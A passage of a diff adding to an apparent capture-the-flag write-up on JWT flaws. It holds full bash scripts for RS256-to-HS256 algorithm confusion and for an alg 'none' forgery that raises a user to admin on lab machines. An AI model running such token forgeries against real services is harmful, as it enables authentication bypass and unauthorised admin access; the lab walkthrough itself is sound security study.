@@ -197,3 +197,85 @@ Complete Bash script to grab the flag, just change the IP variable and you are g
 ```
 ip="10.10.57.132"; body=$(curl --silent http://$ip); jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)'); echo; echo "OLD JWT"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); key="$(curl --silent http://$ip/public.pem -O public.pem)"; echo; echo "OLD HEADER"; echo $header; echo; decoded_header=$(echo $header | base64 -d); new_header=$(echo $decoded_header | sed 's/RS/HS/g'); echo "NEW ALG HEADER"; echo $new_header; echo; new_encoded_header=$(echo -n $new_header | base64); echo "NEW ALG HEADER ENCODED"; echo $new_encoded_header; echo; header_payload=$new_encoded_header.$payload; echo "NEW ALG HEADER + PAYLOAD"; echo $header_payload; echo; hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2); echo "NEW HMAC"; echo $hmac; secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")"); new_jwt=$new_encoded_header.$payload.$secret; echo; echo "NEW JWT"; echo $new_jwt; echo; echo "POSTING JWT"; curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip
 ```
+
+# Task 15 - JWT 2 - Intro
+Exploiting None in JWT
+
+# Task 16 - JWT 2 - Manual Exploitation
+Change header ALG to None, change role to admin, re-encode, drop secret, abuse
+
+JWT debugger
+* https://jwt.io/
+
+# Task 17 - JWT 2 - Automatic Exploitation
+JWT Tool
+* https://github.com/ticarpi/jwt_tool
+
+# Task 18 - JWT 2 - Challenge
+This challenge is similar to the last one except you are given an initial user to login as with a non-admin role.  Once logged in a JWT is generated and you are off to attempting admin access.
+
+* Authenticate using the provided credentials in the web app and save a cookie
+    ```
+     curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none
+    ```
+* Migrate to the authenticated site (/private) using your initial token
+    ```
+    curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'
+    ```
+* Grab the JWT from the cookie
+    ```
+    jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*')
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjEyNjY4MjM5NjI0LCJhZ2VudCI6ImN1cmwvNy43Mi4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MTI2NjgyNDB9.sD9DyMSiWqzg_9Cw3CKpq1RthU9Ft1GA9zgWw-9_DLg
+    ```
+* Separate header and payload
+    ```
+    header=$(echo $jwt_body | cut -d"." -f1)
+    payload=$(echo $jwt_body | cut -d"." -f2)
+    ```
+* Decode header
+    ```
+    decoded_header=$(echo $header | base64 -d)
+    ```
+* Change ALG to none
+    ```
+    change_header=$(echo $decoded_header | sed 's/HS256/none/g')
+    ```
+* Decode payload
+    ```
+    decoded_payload=$(echo $payload | base64 -d)
+    ```
+* Change role from user to admin
+    ```
+    change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g')
+    ```
+* Encode header and payload, remove padding
+    ```
+    new_header=$(echo $change_header | base64 -w 0 | tr -d "=")
+    new_payload=$(echo $change_payload | base64 -w 0 | tr -d "=")
+    ```
+* Create a new JWT without a secret, don't forget trailing period
+    ```
+    new_jwt=$new_header.$new_payload.
+    ```
+* Copy user cookie to an admin cookie placeholder
+    ```
+    cp jwt_none jwt_admin
+    ```
+* Setup pattern to search for the JWT in the cookie
+    ```
+    pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*')
+    ```
+* Replace the user JWT with the admin JWT in the cookie
+    ```
+    sed -i "s/$pattern/$new_jwt/g" jwt_admin
+    ```
+* Refresh your page using the admin cookie/JWT and grab the flag
+    ```
+    curl -b jwt_admin --silent http://$ip/private | grep "text-center"
+    ```
+Complete Bash script to grab the flag, just change the IP variable and you are good
+```
+ip="10.10.150.255"; echo "LOGIN AS NORMAL USER"; curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none; curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'; echo; echo "CHANGING ROLE TO ADMIN"; jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "JWT BODY FROM COOKIE"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); echo; echo "OLD HEADER"; echo $header; echo; echo "OLD PAYLOAD"; echo $payload; decoded_header=$(echo $header | base64 -d); echo; echo "OLD DECODED HEADER"; echo $decoded_header; echo; echo "CHANGE ALG TO NONE"; change_header=$(echo $decoded_header | sed 's/HS256/none/g'); echo $change_header; echo; echo "OLD DECODED PAYLOAD"; decoded_payload=$(echo $payload | base64 -d); echo $decoded_payload; echo; echo "CHANGE ROLE TO ADMIN"; change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g'); echo $change_payload; echo; echo "ENCODE NEW HEADER AND NEW PAYLOAD"; new_header=$(echo $change_header | base64 -w 0 | tr -d "="); new_payload=$(echo $change_payload | base64 -w 0 | tr -d "="); echo $new_header; echo $new_payload; echo; echo "NEW JWT WITHOUT SECRET"; new_jwt=$new_header.$new_payload.; echo $new_jwt; echo; echo "CREATE NEW COOKIE AND STORE NEW ADMIN JWT"; cp jwt_none jwt_admin; ls -lrta jwt_admin; pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "SEARCHING FOR"; echo $pattern; echo; echo -n "UPDATING COOKIE"; sed -i "s/$pattern/$new_jwt/g" jwt_admin; echo; cat jwt_admin; echo; echo "TESTING ADMIN LOGIN"; curl -b jwt_admin --silent http://$ip/private | grep "text-center"
+```
